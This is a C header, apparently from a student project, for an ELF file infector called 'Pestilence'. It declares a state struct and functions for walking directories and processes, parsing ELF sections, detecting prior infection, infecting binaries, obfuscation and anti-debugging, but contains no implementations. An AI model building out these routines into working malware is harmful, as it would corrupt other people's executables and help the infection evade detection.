#ifndef PESTILENCE_H
# define PESTILENCE_H

# include <stdio.h>
# include <unistd.h>
# include <stdlib.h>
# include <string.h>
# include <stdint.h>
# include <elf.h>
# include <sys/stat.h>
# include <sys/mman.h>
# include <sys/types.h>
# include <errno.h>
# include <fcntl.h>
# include <ctype.h>
# include <dirent.h>

# define SIGNATURE "Pestilence version 1.0 (c)oded by davgalle"

typedef struct s_pestilence
{
    int             fd;
    int             valide;
    int             file_size;
    int             anti_virus;
    const char      *binary;
    char            *strtab;
    unsigned char   *elf;
    void            *signd;
    Elf64_Ehdr      *header;
    Elf64_Shdr      *sectab;
    struct stat     file_info;
    struct dirent   *readdir;
    struct dirent   *readproc;
    DIR             *dir;
    DIR             *proc;
    pid_t           pid;
}   t_pestilence;

/* FUNCTIONS */

char    *ft_getdir(int i);
char    *ft_getproc(int i);
int     ft_checkarg(t_pestilence *pestilence);
int     ft_readelf(t_pestilence *pestilence);
void    ft_pointer_section_table(t_pestilence *pestilence);
void    ft_pointer_strings_table(t_pestilence *pestilence);
int     ft_detect_prev_infection(t_pestilence *pestilence);
void    ft_infect(t_pestilence *pestilence);
void    ft_antiprocess(t_pestilence *pestilence);
void    ft_obfuscation(t_pestilence *pestilence);
void    ft_antidebug(t_pestilence *pestilence);

#endif